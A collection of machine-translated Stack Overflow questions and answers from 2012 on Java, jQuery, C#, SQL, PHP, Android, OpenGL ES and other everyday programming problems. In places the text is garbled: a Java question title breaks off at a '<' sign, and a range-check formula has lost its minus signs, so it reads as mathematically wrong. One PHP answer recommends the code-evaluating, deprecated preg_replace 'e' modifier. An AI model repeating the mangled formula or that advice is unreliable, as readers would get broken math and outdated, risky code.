    previousNumber = r;
    return r;
  }

  public static void main(String[] args) {
    while (true) try {
      usedNumbers.clear();
      previousNumber = -1;
      final int[] rands = new int[40];
      for (int i = 0; i < rands.length; i++) rands[i] = generateNumber();
      System.out.println(Arrays.toString(rands));
      break;
    } catch (CulDeSacException e) { System.out.println("Retry"); }
  }
}

class CulDeSacException extends RuntimeException {} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-18T19:09:05.757

你从一个清零数组开始，你逐渐用 1 填充，并且永远不会将它们重置为 0。当数组的大多数元素都是非零时，你很有可能`GenerateNumber`在非常深的嵌套中递归调用，这就是你所经历的。

此外，您永远不会改变`previousNumber`，`GenerateNumber`因此无论生成的随机数如何，您都将始终走同一条路。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-18T19:32:06.103

StackOverFlow 的发生是因为方法/构造函数等的重叠。我在这里，

```
if (numberUsed[number] != 0) {
        return GenerateNumber(previousNumber, numberUsed);
    } 
```

这段代码在 GenerateNumber 方法中，它会继续调用相同的方法。这就是原因。如果您想检查它，请删除该部分并尝试，它会编译得很好。要摆脱这种情况，请消除上述过程。

您可以通过使用循环、while 循环并将所有 if else 语句放入其中来完成

# jquery - jQuery 显示然后在中间隐藏代码，显示不渲染

> ID：10658313
> 
> 赞同：0
> 
> 时间：2012-05-18T18:59:55.807
> 
> 标签：jquery, show-hide

我使用以下建议开发了一个微调器：

[http://blog.oio.de/2010/11/08/how-to-create-a-loading-animation-spinner-using-jquery/](http://blog.oio.de/2010/11/08/how-to-create-a-loading-animation-spinner-using-jquery/)

当我什么都不做但让它运行而不试图隐藏它时，微调器工作。

但是我将微调器嵌入到函数中作为代码的书挡。我在开头展示它，并在结尾处结束它。但它永远不会显示，即使我加载了足够的数据以使延迟超过一秒。

这是代码：

```
 function SortListByDistance(SortReferenceLatitude, SortReferenceLongitude)
    {
        $("#SpinnerControl").show();

        $(".RetailerSearchSectionLine").each(function()
        {
            var SortLocationLatitude = $(".RetailLocationLatitude", $(this)).text();
            var SortLocationLongitude = $(".RetailLocationLongitude", $(this)).text();
            var DistanceFromReferenceLocation = CalculateDistance(SortReferenceLatitude, SortReferenceLongitude, SortLocationLatitude, SortLocationLongitude);
            $(this).data("DistanceFromReferenceLocation", DistanceFromReferenceLocation);
        });

        var TransferArray = $("#RetailerSearchSectionBody ul li").toArray().sort(function(a, b)
        {
            var distance1 = $(a).data("DistanceFromReferenceLocation");
            var distance2 = $(b).data("DistanceFromReferenceLocation");
            return (distance1 - distance2);
        });

        $("#RetailerSearchSectionBody ul").append(TransferArray);
        $("#RetailerSearchSectionBody").scrollTop(0);

        $("#SpinnerControl").hide();
    } 
```

谁能告诉我为什么节目没有渲染？提前感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:09:22.933

问题是在代码完成执行之前不会对屏幕进行任何可见的更改。完成后，该元素已被隐藏，因此您永远看不到它。如果您的意图是在代码执行时显示元素，请使用`setTimeout`：

```
$("#SpinnerControl").show();

setTimeout(function(){
    // do you stuff here

    $("#SpinnerControl").hide();
}, 1); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:09:24.190

对于某些浏览器，您需要将控制权交还给浏览器才能更新 UI。通常在 Firefox 中不是问题，但在 Chrome/IE 中...

我建议使用超时让浏览器也能正常工作（请记住，这会导致`SortListByDistance`异步）：

```
function SortListByDistance(SortReferenceLatitude, SortReferenceLongitude)
{
    $("#SpinnerControl").show();

    setTimeout( function( ) {
        $(".RetailerSearchSectionLine").each(function()
        {
            var SortLocationLatitude = $(".RetailLocationLatitude", $(this)).text();
            var SortLocationLongitude = $(".RetailLocationLongitude", $(this)).text();
            var DistanceFromReferenceLocation = CalculateDistance(SortReferenceLatitude, SortReferenceLongitude, SortLocationLatitude, SortLocationLongitude);
            $(this).data("DistanceFromReferenceLocation", DistanceFromReferenceLocation);
        });

        var TransferArray = $("#RetailerSearchSectionBody ul li").toArray().sort(function(a, b)
        {
            var distance1 = $(a).data("DistanceFromReferenceLocation");
            var distance2 = $(b).data("DistanceFromReferenceLocation");
            return (distance1 - distance2);
        });

        $("#RetailerSearchSectionBody ul").append(TransferArray);
        $("#RetailerSearchSectionBody").scrollTop(0);

        $("#SpinnerControl").hide();
    }, 1 );
} 
```

# jpa - 如何在 roo 中禁用 Web 层自动更新（仅更新 JPA 实体）？

> ID：10658316
> 
> 赞同：0
> 
> 时间：2012-05-18T19:00:03.930
> 
> 标签：jpa, spring-roo, openjpa

在 Roo 中，每次我修改实体（尤其是实体之间的关系）时，Roo 都会更新字段/注释/方面，这很方便，但也会更新 Web 层，这使得 jsp 文件看起来非常混乱。我必须手动禁用“渲染”以在屏幕上清除它们，但仍保留在代码中。

那么，有什么办法可以禁止 Roo 更新 Web 层，让它只关注 JPA 方面的合理变化？

提前致谢，周末愉快。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-21T09:11:45.157

请参阅以下问题的答案。

[我想禁用 Roo 脚手架](https://stackoverflow.com/questions/6229229/i-want-to-disable-roo-scaffolding/6262048#6262048)

干杯。

# arrays - CUDA arrays and c++ vectors

> ID：10658318
> 
> 赞同：0
> 
> 时间：2012-05-18T19:00:09.467
> 
> 标签：arrays, vector, cuda

I'm new at CUDA and have the following question? My kernel is supposed to calculate a type:

```
vector <double *> *my_vector = new vector <double *>(); 
```

Before I tried to change the original c++ code to cuda it would calculate an array[6] in a loop and then push it back to my_vector.

```
for{
          //calculations

        double *array = new double[6];
        array[0] = data;
        array[1] = data;
        array[2] = data;
        array[3] = data;
        array[4] = data;
        array[5] = data;

        my_vector->push_back(array);
} 
```

I know that using thrust could help but I prefer if I didn't use it. I thought of using a 2D array at my kernel and copying the data back to my host code and then copying that to my_vector with the std::vector. What I've tried so far has failed.

If anyone has some experience on this and has any idea it would be much help.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T22:13:17.243

查看为主机和设备代码使用提供有用模板[的 Thrust模板库。](http://thrust.github.io/)`thrust::device_vector`可以像类比一样使用`std::vector`，尽管不在设备代码内部。

# c# - Do I have to worry about garbage collection in this c# EF scenario?

> ID：10658319
> 
> 赞同：2
> 
> 时间：2012-05-18T19:00:14.513
> 
> 标签：c#, memory-leaks, exception-handling, using

```
try
{
  using (MapDataContainer ent = new MapDataContainer()) //is an autogen'd EF object
  {
     //do some stuff, assume it throws an error
  }
}
catch(Exception ex) //catching outside using not sure if IDispose called
{
  //handle error
} 
```

Normally I understand that the using called the IDispose on the EF object. So supposing it threw an exception... Is this a possible memory leak scenario?

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-18T19:01:51.040

You're fine. "using" is actually a try..finally in disguise.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-18T19:17:47.173

正如 MSDN 所说， C# 编译器将[using](http://msdn.microsoft.com/en-us/library/yh598w02.aspx)语句转换为 try-finally 块以确保调用 IDisposable.Dispose()：

```
{
  MapDataContainer ent = new MapDataContainer();
  try
  {
    ...
  }
  finally
  {
    if (ent != null)
      ((IDisposable)ent).Dispose();
  }
} 
```

唯一不调用 IDisposable.Dispose() 的情况是在 using 语句块内部调用[Environment.FailFast](http://msdn.microsoft.com/en-us/library/ms131100.aspx)或在 MapDataContainer() 的构造函数内部或之后引发异常时，但这仍然不会阻止垃圾收集器收集这个对象。此外，实现 IDisposable 的对象通常（但不一定）在析构函数中调用 IDisposable.Dispose() 以确保即使程序员忘记手动调用它或将其包装在 using 语句中，也能正确释放任何非托管资源。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-18T19:02:42.087

该`using`声明实际上是

```
ResourceType resource = expression;
try {
   statement;
}
finally {
   if (resource != null) ((IDisposable)resource).Dispose();
} 
```

如您所见，`Dispose`始终调用 the 。唯一的例外是如果它是 CLR 错误，但在这种情况下，无论如何你都不走运。

# java - Set jtable column to image button, but dynamically change image on specific row/column, not all rows in column

> ID：10658322
> 
> 赞同：2
> 
> 时间：2012-05-18T19:00:25.097
> 
> 标签：java, swing, jtable

I am trying to do the following:

Set all cells in a jtable column to image button1\. When a cell in another row/column changes to a specific value, image button 1 needs to change to image2 in that row only. If rows are deleted, the column image needs to be updated accordingly because the rows shown are filtered from actual defaulttablemodel.

I have done a lot of research and tried different things. I am a java newbie and not good at table cell renderers/editors, which is why i am having so much trouble.

What is currently happening is that the function to change button gets called, but only when i click on button does it hide, and the other image doesn't even show up.

My program does this: btnRenderer = new ButtonRenderer(); btnRenderer.setButtonImagesURL(codebase.toString());

```
btnEditor = new ButtonEditor(table);
btnEditor.setButtonImagesURL(codebase.toString());

table.getColumnModel().getColumn(5).setCellRenderer(btnRenderer);
table.getColumnModel().getColumn(5).setCellEditor(btnEditor); 
```

And on that specific row/column value changing, it calls: this.btnEditor.changeButtonToComplete(); Because i couldn't figure out how to make table listen to change and change the button.

Below are my renderer/editor classes.

```
class ButtonRenderer extends ButtonsPanel implements TableCellRenderer {
private boolean changeIconComplete = false;
ImageIcon imageComplete;

public ButtonRenderer() {
    super();
}

@Override 
public Component getTableCellRendererComponent(JTable table,
        Object value, boolean isSelected, boolean hasFocus, int row, int column) { 
    setBackground(table.getBackground());
    this.setAlignmentX(Component.CENTER_ALIGNMENT);
    this.setAlignmentY(Component.CENTER_ALIGNMENT);
    setToolTipText("Abort upload");

    return this;
}

public void setButtonImagesURL(String codebase)
{
    setButtonImages(codebase);

    URL imgURL = null;

    try {
        imgURL = new URL(codebase + "/img/uploadComplete.png");
    } catch (MalformedURLException e) {
        e.printStackTrace();
    }
    imageComplete = new ImageIcon(imgURL);
}
} 
```

```
public class ButtonEditor extends ButtonsPanel implements TableCellEditor {
Service cloudService;
FileUploader fileUP;
DefaultTableModel model;
int currRow;
int currentlyUploadingRow;

public ButtonEditor(final JTable table) {
    super();

    MouseListener ml = new MouseAdapter() {
        public void mousePressed(MouseEvent e) {
        }
    };

    buttons.get(0).addMouseListener(ml);

    buttons.get(0).addActionListener(new ActionListener() {
        @Override 
        public void actionPerformed(ActionEvent e) {
            if (currRow == currentlyUploadingRow) {
                // Cancel current uploading
                fileUP.setCancelled();
                cloudService.setCancelled();
            } else {
                // Set status to abort
                if (model.getRowCount() == 0 || currRow == -1)
                    return;
                if (model.getValueAt(currRow, 5).toString().contentEquals("Queued") && 
                        (Boolean)model.getValueAt(currRow, 7) == false) {
                    model.setValueAt("Aborted", currRow, 5);
                }
            }
        }
    });

    addMouseListener(new MouseAdapter() {
        @Override 
        public void mousePressed(MouseEvent e) {
        }
    });
}

public void setButtonImagesURL(String codebase)
{
    setButtonImages(codebase);
    createCompletedButton(codebase);
}

public void changeButtonToComplete()
{
    changeAbortToComplete();
}

@Override 
public Component getTableCellEditorComponent(JTable table, Object value, 
        boolean isSelected, int row, int column) {
    //Get table model equivalent of row
    String filename = table.getValueAt(row, 1).toString() + table.getValueAt(row, 0).toString();
    this.currRow = getRowIndexByFilename(filename);
    this.setBackground(table.getBackground());

    return this;
}

private int getRowIndexByFilename(String filename) 
{
    String name;
    for (int row = 0; row < model.getRowCount(); row++) {
        name = model.getValueAt(row, 1).toString() + model.getValueAt(row, 0).toString();
        if (filename.contentEquals(name) && 
                !model.getValueAt(row, 5).toString().contentEquals("Complete") &&
                !model.getValueAt(row, 5).toString().contains("Invalid") &&
                !model.getValueAt(row, 5).toString().contains("Error") &&
                !model.getValueAt(row, 5).toString().contains("Abort"))
            return row;
    }

    return -1;
}

private int getRowIndexByFilenameComplete(String filename) 
{
    String name;
    for (int row = 0; row < model.getRowCount(); row++) {
        name = model.getValueAt(row, 1).toString() + model.getValueAt(row, 0).toString();
        if (filename.contentEquals(name) && 
                model.getValueAt(row, 5).toString().contentEquals("Complete") ||
                model.getValueAt(row, 5).toString().contains("Invalid") ||
                model.getValueAt(row, 5).toString().contains("Error") ||
                model.getValueAt(row, 5).toString().contains("Abort"))
            return row;
    }

    return -1;
}

//  @Override 
public Object getCellEditorValue() {
    return "";
}

@Override 
public boolean isCellEditable(java.util.EventObject e) {
    return true;
}
} 
```

```
public class ButtonsPanel extends JPanel {

public final java.util.List<JButton> buttons = Arrays.asList(new JButton(), new JButton());
public final JButton btnComplete = new JButton();
private ImageIcon[] images = new ImageIcon[2];

public ButtonsPanel() {
    super();
    setOpaque(false);
    this.setLayout(new BoxLayout(this, BoxLayout.Y_AXIS));
    this.setBorder(new javax.swing.border.EmptyBorder(-5, -5, -5, -5));
}

public void setButtonImages(String codebase)
{
    java.util.List<String> imgPaths = Arrays.asList("abortUpload.png", "/img/uploadComplete.png");
    URL imgURL = null;
    int ii = 0;

    for (String path: imgPaths) {
        try {
            imgURL = new URL(codebase + "/img/" + path);
        } catch (MalformedURLException e) {
            e.printStackTrace();
        }
        images[ii] = new ImageIcon(imgURL);
        images[ii].setDescription(path);
        ii++;
    }

    ii = 0;
    for (JButton b: buttons) {
        b.setFocusable(false);
        b.setRolloverEnabled(false);
        b.setIcon(images[ii]);
        b.setBorderPainted(false);
        b.setAlignmentX(Component.CENTER_ALIGNMENT);
        b.setMargin(new Insets(0,0,0,0));
        add(b);
        if (ii == 1)
            this.getComponent(1).hide();
        ii++;
    }
}

public void changeAbortToComplete()
{
    this.getComponent(0).hide();
    this.getComponent(1).show();

} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-18T20:31:30.100

我可能误解了你的问题。但似乎更容易依赖已建立的 table-model-renderer 概念，而不是手动跟踪更改和调用更新。

尝试管理模型中的状态。设计一个渲染器来检查对象的状态并采取相应的行动。然后，作为模型更改的结果，通知并重新绘制表。并且渲染器被触发以呈现更新的数据。

# c# - skeletonization OpenCV In C#

> ID：10658325
> 
> 赞同：1
> 
> 时间：2012-05-18T19:00:31.190
> 
> 标签：c#, opencv

anyone could give me an example of how to skeletonization without using the transform of the distance, or if you have a skeletonization with the transform of distance running. I have an example with OpenCV in C #, more does not work. cvlib.CvDistTransform (pimg ref, ref timg, (int) cvlib.CV_DIST_L2, 3, null, null);

An error in the parameters of the null, and I can not solve. if anyone knows how to solve, or some other example please show me. I am working with OpenCV in C #, but if the example is with OpenCV in C + + or other liguam serves. thank you

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-19T06:26:34.167

这里解释了另一种方法：http: [//felix.abecassis.me/2011/09/opencv-morphological-skeleton/](http://felix.abecassis.me/2011/09/opencv-morphological-skeleton/)

以下是示例结果：

![在此处输入图像描述](../Images/5871974c6746470f065967d09b67cbbd.png) ![在此处输入图像描述](../Images/4925c2989c369909f86e77767a755568.png)

很简单，所有函数都是opencv中的标准函数。它是 Python，但很容易转换为 C#。

# php - 查询两个表的电子邮件地址，每个表只列出一次

> ID：10658326
> 
> 赞同：1
> 
> 时间：2012-05-18T19:00:32.400
> 
> 标签：php, mysql, sql

我有两个表'memberships'和'email_list'。每个都包含一个电子邮件地址字段。有些可能在两个表之间重复。我正在尝试制作一个记录列表，但不显示重复项；每封电子邮件只有一次。

认为 DISTINCT 是我需要去的地方，但不确定如何编写查询，或者我是否需要加入。

任何帮助，将不胜感激！

谢谢，瑞克

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-18T19:03:29.167

[`UNION`](http://dev.mysql.com/doc/refman/5.0/en/union.html)查询应该可以解决问题：

```
SELECT email_address FROM memberships
UNION
SELECT email_address FROM email_list 
```

要选择多个列：

```
SELECT email_address, first_name, last_name FROM memberships
UNION
SELECT email_address, first_name, last_name FROM email_list 
```

上述查询将返回组合的、不同的 email-firstname-lastname 元组。要消除给定电子邮件地址的重复名字和/或姓氏，请将结果包装在一个`GROUP BY`子句中：

```
SELECT * FROM
(
SELECT email_address, first_name, last_name FROM memberships
UNION
SELECT email_address, first_name, last_name FROM email_list
) AS temp
GROUP BY email_address 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:23:25.307

进一步以@Salaman 为例

```
SELECT email_address FROM memberships
UNION
SELECT email_address FROM email_list 
```

然后，您可以通过以下方式获得不同的值：

```
SELECT DISTINCT email_address FROM
(
  SELECT email_address FROM memberships
  UNION
  SELECT email_address FROM email_list
) as combined_emails 
```

如果您的列表不是很大，那么这应该足以易于使用。

# iphone - OpenGL ES 2.0 GLKit GL_LINE_SMOOTH error

> ID：10658328
> 
> 赞同：3
> 
> 时间：2012-05-18T19:00:37.367
> 
> 标签：iphone, ios, opengl-es-2.0, glkit

I'm using drawing a glDrawArrays to draw a GL_LINE_STRIP and want to make them smooth. I've seen on a couple questions here people recommend using glEnable(GL_LINE_SMOOTH) and glHint(GL_LINE_SMOOTH_HINT, GL_NICEST), but when I do so, I'm getting an error. Here's my code:

```
- (void)setupGL
{
    [EAGLContext setCurrentContext:self.context];

    self.effect = [[[GLKBaseEffect alloc] init] autorelease];
    self.effect.light0.enabled = GL_FALSE;
    self.effect.light1.enabled = GL_FALSE;
    self.effect.light2.enabled = GL_FALSE;
    self.effect.lightModelAmbientColor = GLKVector4Make(0.0f, 0.0f, 0.0f, 1.0f);

    glDisable(GL_DEPTH_TEST);
//    glEnable(GL_LINE_SMOOTH);
//    glHint(GL_LINE_SMOOTH_HINT, GL_NICEST);
    glEnable(GL_BLEND);
    glBlendFunc(GL_SRC_ALPHA, GL_ONE_MINUS_SRC_ALPHA);

    glGenVertexArraysOES(1, &_vertexArray);
    glBindVertexArrayOES(_vertexArray);

    glGenBuffers(1, &_vertexBuffer);
    glBindBuffer(GL_ARRAY_BUFFER, _vertexBuffer);
    glBufferData(GL_ARRAY_BUFFER, sizeof(vertexData), vertexData, GL_DYNAMIC_DRAW);

    glEnableVertexAttribArray(GLKVertexAttribPosition);
    glVertexAttribPointer(GLKVertexAttribPosition, VERTEX_POS_DATA_SIZE, GL_FLOAT, GL_FALSE, VERTEX_DATA_SIZE * sizeof(GLfloat), BUFFER_OFFSET(0));

    glEnableVertexAttribArray(GLKVertexAttribColor);
    glVertexAttribPointer(GLKVertexAttribColor, VERTEX_COLOR_DATA_SIZE, GL_FLOAT, GL_FLOAT, VERTEX_DATA_SIZE * sizeof(GLfloat), BUFFER_OFFSET(VERTEX_POS_DATA_SIZE * sizeof(GLfloat)));    

    glLineWidth(10.0);
} 
```

If I uncomment either (or both) of those lines, I get a GL ERROR. Any thoughts?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-20T02:51:28.837

我在 ES1.1 上下文中工作（很好！），即

```
self.context = [[EAGLContext alloc] initWithAPI:kEAGLRenderingAPIOpenGLES1]; 
```

我正在编写新代码并尝试顺应未来的潮流（或者至少是现在最近的过去）并跳到 ES2.0。在 2.0 宇宙中，我取得了适度的成功

```
view.drawableMultisample = GLKViewDrawableMultisample4X; 
```

在我`GLKViewController`的`-viewDidLoad`覆盖中设置，在我的`GLKView`. YMMV。

# android - Show settings under accounts & sync menu for android app

> ID：10658330
> 
> 赞同：14
> 
> 时间：2012-05-18T19:00:39.980
> 
> 标签：android, android-syncadapter, accounts

I am implementing a syncadapter for an android app and would like to make the settings for the account available under the "Accounts & sync" menu. I have seen this done in the DropBox app(as shown below), but I have not been able to find documentation on how to do this. I have the accounted added, just want to add a link to the account settings in this menu.

![enter image description here](../Images/975de1a222ab0b0362fc17b0ecb20453.png)

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2012-05-20T18:58:52.907

在您的 Android Manifest 中，您应该有这样的部分来定义您的帐户验证器：

```
<service android:name="AccountAuthenticatorService"
 android:exported="true" android:process=":auth">
 <intent-filter>
  <action android:name="android.accounts.AccountAuthenticator" />
 </intent-filter>
 <meta-data android:name="android.accounts.AccountAuthenticator"
  android:resource="@xml/authenticator" />
</service> 
```

上面的元数据标记应该指向一个定义您的帐户的 XML 文件，如下所示：

```
<account-authenticator xmlns:android="http://schemas.android.com/apk/res/android"
    android:accountType="fm.last.android.account"
    android:icon="@drawable/icon"
    android:smallIcon="@drawable/icon"
    android:label="@string/app_name"
    android:accountPreferences="@xml/account_preferences"/> 
```

上面的 android:accountPreferences 属性指向定义您的首选项屏幕的 XML 文件，如下所示：

```
<PreferenceScreen
  xmlns:android="http://schemas.android.com/apk/res/android">
    <PreferenceCategory
            android:title="General Settings" />

    <PreferenceScreen
        android:key="account_settings"
        android:title="Account Settings"
        android:summary="Sync frequency, notifications, etc.">
        <intent
            android:action="fm.last.android.activity.Preferences.ACCOUNT_SETUP"
            android:targetPackage="fm.last.android"
            android:targetClass="fm.last.android.activity.Preferences" />
    </PreferenceScreen>
</PreferenceScreen> 
```

上面的 PreferenceScreen 将启动一个显示设置屏幕的意图，但您也可以直接在 XML 文件中定义设置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-18T20:16:52.807

如果我理解正确，您想在您的应用程序中显示“帐户和同步设置”屏幕。为此，您必须触发设置意图。使用下面给出的代码：

```
Intent intent = new Intent(Intent.ACTION_MAIN);
intent.setComponent(new ComponentName("com.android.providers.subscribedfeeds","com.android.settings.ManageAccountsSettings"));
intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(intent); 
```

希望这有帮助...

# javascript - phonegap how to store files in the local filesystem

> ID：10658333
> 
> 赞同：1
> 
> 时间：2012-05-18T19:00:57.123
> 
> 标签：javascript, cordova

I'm looking for the appropriate way of storing files into the document folder within phonegap/cordova.

I've done some google searches but all I seem to find is how to use local storage or webSQL.

Also looked at the phonegap plugins github page but nothing seems promising.

The file I'm looking to store is actually a binary file I'll download from the internet.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-18T19:27:12.293

然后，您将需要使用[FileTransfer.download](http://docs.phonegap.com/en/1.7.0/cordova_file_file.md.html#FileTransfer_download)从 Internet 获取二进制文件。然后您可以使用[File API](http://docs.phonegap.com/en/1.7.0/cordova_file_file.md.html#File)对其进行操作。

# excel - For every column in a sheet search for a value in a cell, then select that column and insert a column before that one

> ID：10658336
> 
> 赞同：2
> 
> 时间：2012-05-18T19:01:14.523
> 
> 标签：excel, vba

I was trying to write a macro that performed the following:

For every sheet in the workbook: 1\. Select a column 2\. Search in the selected column for a specific value in the Row number 5 3\. If that value matches another cel (A1), then Insert two columns before the selected column

1.  Perform the same for every column in the sheet. (i mean, those columns where there is something, I know that there are an infinite amount of potential columns).

Any help or direction toward an answer would be more than helpful.

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-18T19:44:40.647

我想，这会让你得到你所追求的。

```
Dim wks As Worksheet

For Each wks In ThisWorkbook.Worksheets

    With wks
        Dim intCol As Integer, intCnt As Integer

        intCol = .UsedRange.Columns.Count

        For intCnt = intCol To 2 Step -1 'assumes you ignore col A since your match value is there
            If .Cells(5, intCnt) = .Cells(1, 1) Then
                .Range(.Cells(1, intCnt), .Cells(1, intCnt + 1)).EntireColumn.Insert Shift:=xlToLeft
            End If
        Next

    End With

Next 
```

# java - Java 链式不等式 if (5 这种操作有什么操作符或技巧吗？或者是否有必要使用 if(5 *> ID：10658343
> 
> 赞同：17
> 
> 时间：2012-05-18T19:01:47.140
> 
> 标签：java, types, primitive, logical-operators

这种操作有什么操作符或技巧吗？或者是否有必要使用

```
if(5<i && i<10) 
```

?

* * *

## 回答 #1

> 赞同：24
> 
> 时间：2012-05-18T19:03:02.480

你不能把不平等串联起来。但是，您可以定义一个静态布尔方法`isInRange(value, low, high)`来执行此类检查。

其他一些语言，如 Python 或[Icon](http://www.cs.arizona.edu/icon/)，允许使用这种表示法。

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-05-18T19:03:51.147

Java 中没有这样的东西（除非您使用布尔值）。

结果是编译器不喜欢`5<i`的左侧的布尔值。`<10`

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-05-18T19:04:40.717

恐怕目前 Java 不支持链式不等式。检查[这篇](https://stackoverflow.com/questions/2644044/chained-inequality-notation-in-programming-languages)文章的语言。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2012-05-18T19:07:24.470

您可以使用单个比较，但通常比它的价值更复杂。

```
if (i - (Integer.MIN_VALUE + 6) < Integer.MIN_VALUE + (10 - 6)) 
```

这使用下溢将所有值 5 及以下调整为一个大的正值。

您使用它的唯一原因是作为微优化。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2018-01-28T17:40:19.917

# 范围

比较不能在 Java 中链接。

进行范围检查的标准方法是使用[*Guava Ranges*](https://github.com/google/guava/wiki/RangesExplained)：

```
import com.google.common.collect.Range;
...
    if(Range.open(5, 10).contains(x)){ 
```

或 Apache Commons Lang（不过它只提供封闭范围）：

```
import org.apache.commons.lang3.Range;
...
    if(Range.between(5 + 1, 10 - 1).contains(x)){ 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2014-07-11T14:05:06.340

a < x < b 等价于 (xa)(xb)<0，或者如果 x 是您只想计算一次的表达式，

(x - (a+b)/2) ^ 2 < (ba)^2 / 4

同样处理两个非严格等式。但是，我认为没有办法处理一个严格相等和一个非严格相等（除非 x 是整数）。*

# php - 正则表达式替换 PHP 中的 html src 属性

> ID：10658348
> 
> 赞同：10
> 
> 时间：2012-05-18T19:02:09.657
> 
> 标签：php, html, regex

我正在尝试使用正则表达式替换 PHP 中的源属性（可以是图像或任何标签）。

我有一个这样的字符串：

```
$string2 = "<html><body><img src = 'images/test.jpg' /><img src = 'http://test.com/images/test3.jpg'/><video controls="controls" src='../videos/movie.ogg'></video></body></html>"; 
```

我想把它变成：

```
$string2 = "<html><body><img src = 'test.jpg' /><img src = 'test3.jpg'/><video controls="controls" src='movie.ogg'></video></body></html>"; 
```

这是我尝试过的：

```
$string2 = preg_replace("/src=["']([/])(.*)?["'] /", "'src=' . convert_url('$1') . ')'" , $string2);
echo htmlentities ($string2); 
```

基本上它没有改变任何东西，并给了我一个关于未转义字符串的警告。

不`$1`发送字符串的内容？这里有什么问题？

convert_url 的功能来自我之前在此处发布的示例：

```
function convert_url($url)
{
    if (preg_match('#^https?://#', $url)) {
        $url = parse_url($url, PHP_URL_PATH);
    }
    return basename($url);
} 
```

它应该去除 url 路径并只返回文件名。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-05-18T19:04:44.660

不要在 HTML 上使用正则表达式 - 使用[`DOMDocument`](http://php.net/manual/en/class.domdocument.php)类。

```
$html = "<html>
           <body>
             <img src='images/test.jpg' />
             <img src='http://test.com/images/test3.jpg'/>
             <video controls='controls' src='../videos/movie.ogg'></video>
           </body>
         </html>";

$dom = new DOMDocument;  
libxml_use_internal_errors(true);

$dom->loadHTML( $html ); 
$xpath = new DOMXPath( $dom );
libxml_clear_errors();

$doc = $dom->getElementsByTagName("html")->item(0);
$src = $xpath->query(".//@src");

foreach ( $src as $s ) {
  $s->nodeValue = array_pop( explode( "/", $s->nodeValue ) );
}

$output = $dom->saveXML( $doc );

echo $output; 
```

输出以下内容：

```
<html>
  <body>
    <img src="test.jpg">
    <img src="test3.jpg">
    <video controls="controls" src="movie.ogg"></video>
  </body>
</html> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-18T19:38:44.720

你必须使用`e`修饰符。

```
$string = "<html><body><img src='images/test.jpg' /><img src='http://test.com/images/test3.jpg'/><video controls=\"controls\" src='../videos/movie.ogg'></video></body></html>";

$string2 = preg_replace("~src=[']([^']+)[']~e", '"src=\'" . convert_url("$1") . "\'"', $string); 
```

请注意，使用`e`修饰符时，替换脚本片段**需要为字符串**，以防止在调用 preg_replace 之前对其进行解释。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-08-07T13:51:53.707

```
function replace_img_src($img_tag) {
    $doc = new DOMDocument();
    $doc->loadHTML($img_tag);
    $tags = $doc->getElementsByTagName('img');
    foreach ($tags as $tag) {
        $old_src = $tag->getAttribute('src');
        $new_src_url = 'website.com/assets/'.$old_src;
        $tag->setAttribute('src', $new_src_url);
    }
    return $doc->saveHTML();
} 
```

# xna-4.0 - xna 4 截取桌面截图

> ID：10658361
> 
> 赞同：0
> 
> 时间：2012-05-18T19:03:08.840
> 
> 标签：xna-4.0

我目前正在工作中开发一个新应用程序，需要一些帮助。

基本上我需要对在用户桌面（不是我的应用程序）上运行的应用程序进行实时屏幕截图，然后使用阴影扭曲图像并以每秒 60 帧的速度显示包装的屏幕截图。

我有一个 Windows 窗体应用程序可以执行此操作，但我每秒获得 6 帧，当我将其扩展到 1600x1600 时，它会下降到 2fps。

所以我想，如果我能在 xna 中做到这一点并尽可能多地移动到 GPU 上，它会加快速度。

所以我用谷歌搜索和谷歌搜索，除了我的 xna 应用程序之外，找不到任何关于如何在 xna 中获取正在运行的应用程序屏幕截图的信息。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-18T19:21:08.210

您可以使用[XNA](http://msdn.microsoft.com/en-us/centrum-xna.aspx)或额外的[DWM](http://msdn.microsoft.com/en-us/library/aa969540.aspx)或[GDI+](http://msdn.microsoft.com/en-us/library/ms533798%28v=vs.85%29)来获得完整的桌面。以下是一些可以帮助您的链接：

*   [捕获隐藏桌面的屏幕截图](https://stackoverflow.com/questions/10375509/capture-screenshot-of-hidden-desktop)
*   [有没有办法截取用户的 Windows 桌面？](https://stackoverflow.com/questions/880878/is-there-a-way-to-take-a-screenshot-of-the-users-windows-desktop)
*   [C：截图](https://stackoverflow.com/questions/3370702/c-take-screenshot)
*   [在 Windows 中使用 C++ 截取窗口的最佳方式是什么？](https://stackoverflow.com/questions/531684/what-is-the-best-way-to-take-screenshots-of-a-window-with-c-in-windows)
*   [在 XNA 中截屏](https://stackoverflow.com/questions/1775196/take-screen-shot-in-xna)

我认为没有办法获得另一个应用程序的窗口截图。您可以使用一些模式检测代码来找出窗口在哪里，但我不建议这样做。

# ruby-on-rails - 还有另一种方法可以在 Ruby on Rails 中编写它吗？

> ID：10658366
> 
> 赞同：0
> 
